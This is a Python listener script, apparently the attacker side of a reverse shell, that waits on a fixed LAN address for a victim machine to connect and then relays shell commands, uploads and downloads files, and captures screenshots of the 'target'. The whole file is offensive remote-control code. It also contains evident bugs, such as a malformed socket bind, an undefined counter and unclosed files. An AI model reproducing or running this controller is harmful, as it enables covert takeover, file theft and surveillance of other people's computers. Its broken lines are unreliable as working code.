import socket
from termcolor import colored
import json
import os
import subprocess

def data_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read())

def screenshot():
    f = open('screenshot%d' % (count), 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close
    count += 1

def download_file(file):
    f = open(file, 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close

def tc(): #term communication
    count = 0
    while True:
        comm = input('* Shell~%\s: '% str(ip))
        data_send(comm)
        if comm == 'exit':
            break
        elif comm == 'clear':
            os.system('clear')
        elif comm[:3] == 'cd ':
            pass
        elif comm[:6] == 'upload':
            upload_file(comm[7:])
        elif comm[:8] == 'download':
            download_file(comm[9:])
        elif comm[:10] == 'screenshot':
            screenshot()
        elif comm == 'help':
            print(colored(''''
                exit: close the session on the target machine
                clear: clean the screen from the terminal
                cd + "DirectoryName": change the directory on the target machine
                upload + "FileName": send a file to the target machine
                download + "FileName": Download a file from the target machine
                screenshot: takes a screenshot from the target machine
                help: help the user to use the commands
            '''), 'green')
        else:
            awnser = data_recv()
            print(awnser)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.0.107, 2371'))

print(colored('[-] Aguardando conexao', 'green'))

sock.listen(5)

target, ip = sock.accept()
print(colored('+ Conectado com o ip: ' + str(ip), 'green'))
tc()